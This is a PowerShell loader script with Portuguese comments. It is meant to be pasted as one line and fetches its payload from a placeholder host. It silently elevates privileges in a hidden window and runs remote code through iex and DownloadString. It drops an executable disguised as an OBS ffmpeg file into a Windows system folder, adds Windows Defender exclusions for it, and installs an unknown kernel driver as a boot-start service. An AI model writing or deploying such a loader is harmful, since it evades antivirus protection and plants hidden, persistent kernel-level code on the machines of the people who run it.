# chama.ps1 - loader de 1 comando
# O cliente cola uma linha no CMD e tudo acontece aqui dentro:
# baixa os arquivos, instala o driver (inicio no boot), coloca as
# exclusoes no Defender (que continua SEMPRE ATIVO) e abre o menu.
# Nada aparece no desktop, nada no menu iniciar, nada de .bat.

$ErrorActionPreference = 'SilentlyContinue'

# >>> UNICA COISA QUE VOCE PRECISA MUDAR: a URL base dos seus arquivos <<<
# Os arquivos no host devem se chamar:  muxx  (o exe)  e  drv  (o driver)
$U = 'https://SEU-SITE-AQUI/arquivos'

# --- auto-elevacao (pede o UAC so uma vez, sem janela de script) ---
$I = [Security.Principal.WindowsIdentity]::GetCurrent()
if (-not ([Security.Principal.WindowsPrincipal]$I).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList @(
        '-NoProfile','-ExecutionPolicy','Bypass','-Command',
        "iex((New-Object Net.WebClient).DownloadString('$U/chama.ps1'))"
    )
    exit
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- baixa os arquivos direto para dentro das pastas do sistema ---
$D = "$env:WINDIR\SysWOW64\slmgr\0416"
New-Item -ItemType Directory -Force -Path $D | Out-Null

$W = New-Object Net.WebClient
$W.DownloadFile("$U/muxx", "$D\obs-ffmpeg-Muxx.exe")
$W.DownloadFile("$U/drv",  "$env:WINDIR\4ware.sys")

if (-not (Test-Path "$D\obs-ffmpeg-Muxx.exe")) { exit 1 }

# --- exclusoes apenas (Defender continua sempre ativo) ---
Add-MpPreference -ExclusionPath $D
Add-MpPreference -ExclusionPath "$env:WINDIR\4ware.sys"
Add-MpPreference -ExclusionProcess 'obs-ffmpeg-Muxx.exe'

# --- driver kernel: cria/inicia, inicio no BOOT (Start=1) ---
sc.exe stop 4ware | Out-Null
Start-Sleep -Milliseconds 2500
sc.exe create 4ware type= kernel start= system binPath= "$env:WINDIR\4ware.sys" | Out-Null
sc.exe config 4ware start= system | Out-Null
sc.exe start 4ware | Out-Null

# --- abre o menu (o modo kernel ja vem ligado de fabrica) ---
Start-Process "$D\obs-ffmpeg-Muxx.exe"

exit 0
